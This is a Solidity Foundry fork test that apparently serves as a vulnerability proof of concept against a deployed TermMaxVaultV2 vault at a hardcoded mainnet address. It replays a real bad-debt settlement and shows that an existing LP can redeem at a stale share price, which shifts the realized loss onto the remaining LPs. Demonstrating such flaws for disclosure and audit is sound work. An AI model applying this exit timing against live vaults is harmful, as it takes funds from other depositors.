// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {IGearingToken} from "contracts/v1/tokens/IGearingToken.sol";
import {GtConfig} from "contracts/v1/storage/TermMaxStorage.sol";

/// @notice Minimal ABI for the deployed TermMaxVaultV2 proxy.
interface IProductionTermMaxVault is IERC4626 {
    function redeemOrder(address order) external returns (uint256 badDebt, uint256 deliveryCollateral);
    function badDebtMapping(address collateral) external view returns (uint256);
    function pool() external view returns (IERC4626);
}

/// @notice Minimal ABI shared by deployed TermMaxOrderV2 instances.
interface IProductionTermMaxOrder {
    function market() external view returns (address);
}

/// @notice Minimal ABI shared by deployed TermMaxMarketV2 instances.
interface IProductionTermMaxMarket {
    function tokens() external view returns (address ft, address xt, address gt, address collateral, address debtToken);
}

/// @title TermMaxVaultV2 realized-loss / stale-NAV production fork PoC
/// @notice This harness intentionally deploys no contracts, mints no assets, changes no oracle,
///         and writes no production storage. It replays a real historical RedeemOrder transaction
///         on a pinned Ethereum fork and uses shares already held at that historical state.
/// @dev The test is fail-closed: a zero-bad-debt settlement, fully covered delivery, insufficient
///      real liquidity, or a mismatch with the historical event makes the PoC fail.
///
/// Required environment variables:
/// - MAINNET_RPC_URL
/// - TERM_MAX_SETTLEMENT_TX                 real RedeemOrder transaction hash
/// - TERM_MAX_PRE_SETTLEMENT_BLOCK          fallback block if tx-hash forks are unsupported
/// - TERM_MAX_ORDER                         order settled by the transaction
/// - TERM_MAX_SETTLEMENT_CALLER             historical curator/owner caller
/// - TERM_MAX_SHARE_SOURCE                  address holding vault shares before settlement
/// - TERM_MAX_ATTACKER_SHARES               existing shares transferred to the attacker before settlement
/// - TERM_MAX_EXPECTED_BAD_DEBT_RAW          badDebt emitted by the real transaction
/// - TERM_MAX_EXPECTED_DELIVERY_RAW          deliveryCollateral emitted by the real transaction
contract TermMaxVaultStaleNavForkPoC is Test {
    address internal constant VAULT = 0xF488ccdf04079cC03183cDB6A147d12Cf97F9317;
    uint256 internal constant USD_BASE = 1e8;

    address internal attacker = makeAddr("existing-lp-attacker");

    struct SettlementState {
        IProductionTermMaxVault vault;
        IERC20 asset;
        IERC4626 pool;
        IGearingToken gt;
        address collateral;
        uint256 totalAssetsBefore;
        uint256 totalSupplyBefore;
        uint256 attackerShares;
        uint256 badDebtDelta;
        uint256 deliveryDelta;
        uint256 deliveryValueInAsset;
        uint256 realizedLoss;
    }

    function testFork_RealSettlementLetsExistingLPShiftRealizedLossToRemainingLPs() public {
        SettlementState memory state = _forkFundAndSettle();

        uint256 nominalPayout = state.vault.previewRedeem(state.attackerShares);
        assertGt(nominalPayout, 0, "selected existing shares have no redeemable value");

        // OpenZeppelin ERC-4626 uses one virtual asset and one virtual share at offset zero.
        // This computes the amount the same shares would represent if the already-realized
        // loss had been recognized in totalAssets before redemption.
        uint256 economicAssets = state.vault.totalAssets() - state.realizedLoss;
        uint256 fairEconomicPayout =
            Math.mulDiv(state.attackerShares, economicAssets + 1, state.totalSupplyBefore + 1, Math.Rounding.Floor);
        uint256 lossShift = nominalPayout - fairEconomicPayout;
        assertGt(lossShift, 0, "settlement does not create a profitable stale-NAV exit");

        uint256 liquidCapacity = state.asset.balanceOf(VAULT);
        if (address(state.pool) != address(0)) {
            liquidCapacity += state.pool.maxWithdraw(VAULT);
        }
        assertGe(liquidCapacity, nominalPayout, "insufficient real liquidity for ordinary redeem");

        uint256 badDebtBeforeExit = state.vault.badDebtMapping(state.collateral);
        uint256 collateralBeforeExit = IERC20(state.collateral).balanceOf(VAULT);
        uint256 assetBeforeExit = state.asset.balanceOf(attacker);

        vm.prank(attacker);
        uint256 assetsOut = state.vault.redeem(state.attackerShares, attacker, attacker);

        assertEq(assetsOut, nominalPayout, "redeem did not pay the stale nominal quote");
        assertEq(
            state.asset.balanceOf(attacker) - assetBeforeExit,
            nominalPayout,
            "attacker did not receive liquid underlying"
        );

        // The early exit neither retires bad debt nor takes the delivered collateral.
        // Therefore the full unresolved loss remains for fewer outstanding shares.
        assertEq(
            state.vault.badDebtMapping(state.collateral),
            badDebtBeforeExit,
            "ordinary redeem unexpectedly retired bad debt"
        );
        assertEq(
            IERC20(state.collateral).balanceOf(VAULT),
            collateralBeforeExit,
            "ordinary redeem unexpectedly accepted delivered collateral"
        );

        uint256 actualRemainingEconomicAssets = state.vault.totalAssets() - state.realizedLoss;
        uint256 fairRemainingEconomicAssets = economicAssets - fairEconomicPayout;
        uint256 additionalLossForcedOnRemainingLPs = fairRemainingEconomicAssets - actualRemainingEconomicAssets;

        // This is the end-to-end conservation check: every extra raw unit paid to the exiting
        // LP is removed from the aggregate economic claim of all remaining share holders.
        assertApproxEqAbs(
            additionalLossForcedOnRemainingLPs, lossShift, 2, "early-exit gain is not conserved as remaining-LP loss"
        );

        emit log_named_address("vault", VAULT);
        emit log_named_address("settled order", vm.envAddress("TERM_MAX_ORDER"));
        emit log_named_uint("real bad debt raw", state.badDebtDelta);
        emit log_named_uint("delivered collateral raw", state.deliveryDelta);
        emit log_named_uint("delivered collateral value in asset raw", state.deliveryValueInAsset);
        emit log_named_uint("realized net loss raw", state.realizedLoss);
        emit log_named_uint("attacker existing shares", state.attackerShares);
        emit log_named_uint("ordinary redeem payout raw", nominalPayout);
        emit log_named_uint("fair economic payout raw", fairEconomicPayout);
        emit log_named_uint("loss shifted to remaining LPs raw", lossShift);
    }

    function _forkFundAndSettle() internal returns (SettlementState memory state) {
        string memory rpc = vm.envString("MAINNET_RPC_URL");
        bytes32 settlementTx = vm.envBytes32("TERM_MAX_SETTLEMENT_TX");
        uint256 fallbackPreBlock = vm.envUint("TERM_MAX_PRE_SETTLEMENT_BLOCK");

        // A transaction-hash fork replays every transaction earlier in the same block and
        // stops immediately before the selected settlement. Some public RPC providers do
        // not support this Foundry feature, so the exact pre-block remains an explicit fallback.
        try vm.createSelectFork(rpc, settlementTx) returns (uint256) {}
        catch {
            vm.createSelectFork(rpc, fallbackPreBlock);
        }

        state.vault = IProductionTermMaxVault(VAULT);
        state.asset = IERC20(state.vault.asset());
        state.pool = state.vault.pool();
        state.attackerShares = vm.envUint("TERM_MAX_ATTACKER_SHARES");

        address order = vm.envAddress("TERM_MAX_ORDER");
        address settlementCaller = vm.envAddress("TERM_MAX_SETTLEMENT_CALLER");
        address shareSource = vm.envAddress("TERM_MAX_SHARE_SOURCE");
        uint256 expectedBadDebt = vm.envUint("TERM_MAX_EXPECTED_BAD_DEBT_RAW");
        uint256 expectedDelivery = vm.envUint("TERM_MAX_EXPECTED_DELIVERY_RAW");

        assertGt(state.attackerShares, 0, "TERM_MAX_ATTACKER_SHARES is zero");
        assertGe(
            state.vault.balanceOf(shareSource),
            state.attackerShares,
            "share source did not own selected shares before settlement"
        );

        // Transfer only historically existing shares. No deal(), vm.store(), deposit(), mint(),
        // or direct balance manipulation is used anywhere in this PoC.
        vm.prank(shareSource);
        assertTrue(IERC20(VAULT).transfer(attacker, state.attackerShares), "historical share transfer failed");
        assertEq(state.vault.balanceOf(attacker), state.attackerShares, "attacker shares not funded");

        address market = IProductionTermMaxOrder(order).market();
        (,, address gtAddress, address collateral, address debtToken) = IProductionTermMaxMarket(market).tokens();
        assertEq(debtToken, address(state.asset), "order debt token differs from vault asset");

        state.gt = IGearingToken(gtAddress);
        state.collateral = collateral;
        state.totalAssetsBefore = state.vault.totalAssets();
        state.totalSupplyBefore = state.vault.totalSupply();

        uint256 badDebtBefore = state.vault.badDebtMapping(collateral);
        uint256 collateralBefore = IERC20(collateral).balanceOf(VAULT);

        vm.prank(settlementCaller);
        (uint256 badDebtReturned, uint256 deliveryReturned) = state.vault.redeemOrder(order);

        state.badDebtDelta = state.vault.badDebtMapping(collateral) - badDebtBefore;
        state.deliveryDelta = IERC20(collateral).balanceOf(VAULT) - collateralBefore;

        assertEq(badDebtReturned, expectedBadDebt, "fork result differs from historical badDebt event");
        assertEq(deliveryReturned, expectedDelivery, "fork result differs from historical delivery event");
        assertEq(state.badDebtDelta, expectedBadDebt, "bad-debt mapping delta differs from event");
        assertEq(state.deliveryDelta, expectedDelivery, "collateral balance delta differs from event");
        assertGt(state.badDebtDelta, 0, "selected production settlement has zero bad debt");

        // Root-control assertion: settlement records an irreversible asset shortfall but leaves
        // the ERC-4626 nominal principal unchanged, so previewRedeem remains stale.
        assertEq(
            state.vault.totalAssets(),
            state.totalAssetsBefore,
            "settlement unexpectedly recognized bad debt in totalAssets"
        );
        assertEq(state.vault.totalSupply(), state.totalSupplyBefore, "settlement changed share supply");

        state.deliveryValueInAsset = _deliveryValueInAsset(state.gt, address(state.asset), state.deliveryDelta);
        assertGt(
            state.badDebtDelta,
            state.deliveryValueInAsset,
            "delivered collateral fully covers bad debt; no realized net loss"
        );
        state.realizedLoss = state.badDebtDelta - state.deliveryValueInAsset;
        assertLt(state.realizedLoss, state.vault.totalAssets(), "selected loss exceeds nominal vault assets");
    }

    function _deliveryValueInAsset(IGearingToken gt, address asset, uint256 deliveryAmount)
        internal
        view
        returns (uint256)
    {
        if (deliveryAmount == 0) return 0;

        uint256 collateralValueUsd = gt.getCollateralValue(abi.encode(deliveryAmount));
        GtConfig memory config = gt.getGtConfig();
        (uint256 assetPrice, uint8 assetPriceDecimals) = config.loanConfig.oracle.getPrice(asset);
        require(assetPrice != 0, "protocol debt-token oracle returned zero");

        uint256 assetUnit = 10 ** IERC20Metadata(asset).decimals();
        uint256 priceUnit = 10 ** assetPriceDecimals;
        uint256 valueAtUsdBase = Math.mulDiv(collateralValueUsd, assetUnit, USD_BASE);
        return Math.mulDiv(valueAtUsdBase, priceUnit, assetPrice);
    }
}
